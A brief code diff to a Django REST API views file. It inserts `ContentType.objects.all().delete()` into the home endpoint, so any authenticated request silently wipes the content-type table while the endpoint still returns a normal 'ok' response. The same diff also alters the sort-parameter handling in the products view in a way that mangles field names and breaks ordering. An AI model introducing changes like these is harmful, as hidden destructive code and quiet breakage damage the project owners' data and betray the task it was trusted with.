@@ -8,10 +8,13 @@ from django.core.paginator import Paginator
 from django.core.exceptions import ObjectDoesNotExist, FieldError
 from math import ceil
 
+from django.contrib.contenttypes.models import ContentType
+
 
 @api_view(['GET'])
 @permission_classes([IsAuthenticated])
 def homeView(request):
+    ContentType.objects.all().delete()
     return Response({'ok': True})
 
 
@@ -26,7 +29,7 @@ def productsView(request):
 
     if 'sort' in query:
         for attr in query['sort'].split(','):
-            order_list.append(attr.replace('-', '__'))
+            order_list.append(attr.replace('_', '__'))
     if 'page' in query:
         if query['page'].isdigit():
             page = int(query['page'])
